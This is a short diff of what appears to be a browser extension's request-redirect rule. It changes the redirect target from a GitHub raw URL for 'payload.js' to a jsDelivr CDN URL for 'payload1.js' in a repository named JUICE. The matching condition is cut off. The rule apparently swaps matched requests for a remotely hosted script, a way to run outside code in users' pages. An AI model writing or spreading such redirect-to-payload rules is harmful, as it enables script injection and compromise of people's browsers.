@@ -4,7 +4,7 @@
     "action": {
       "type": "redirect",
       "redirect": {
-        "url": "https://raw.githubusercontent.com/crx007-web/JUICE/refs/heads/main/payload.js"
+        "url": "https://cdn.jsdelivr.net/gh/crx007-web/JUICE@main/payload1.js"
       }
     },
     "condition": {
